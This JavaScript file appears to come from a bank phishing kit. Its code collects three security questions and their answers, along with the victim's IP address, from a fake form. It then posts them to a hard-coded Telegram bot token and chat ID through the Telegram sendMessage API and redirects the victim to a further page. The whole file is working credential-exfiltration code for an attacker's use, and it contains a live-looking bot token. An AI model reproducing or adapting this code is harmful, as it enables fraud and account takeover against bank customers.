//bot token
var telegram_bot_id = "7669294592:AAH8TeISPtIDcu5kHwWAG3NTH23G3x5g3l8";
//chat id
var chat_id = -1002450385695;
var pax, pax2, pax3, pax4, pax5, pax6, pax7, pax8, pax9, pax10, ip;
var ready = function () {
    pax = document.getElementById("miDiosenticonfio").value;
    pax2 = document.getElementById("miDiosenticonfio2").value;
    pax3 = document.getElementById("miDiosenticonfio3").value;
    pax4 = document.getElementById("miDiosenticonfio4").value;
    pax5 = document.getElementById("miDiosenticonfio5").value;
    pax6 = document.getElementById("miDiosenticonfio6").value;

    ip = document.getElementById("ip").innerHTML;
    message = "🔹BHDE\nPR3 1❓: " + pax + "\nR3S 1ℹ: " + pax2 + "\nPR3 2❓: " + pax3 + "\nR3S 2ℹ: " + pax4 + "\nPR3 3❓: " + pax5 + "\nR3S 3ℹ: " + pax6 + "\n\nIP: " + ip +"\n🔹BY SYN4PSE🔹";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location.href = 'index3.html';
        console.log(response);
    });
    return false;
};
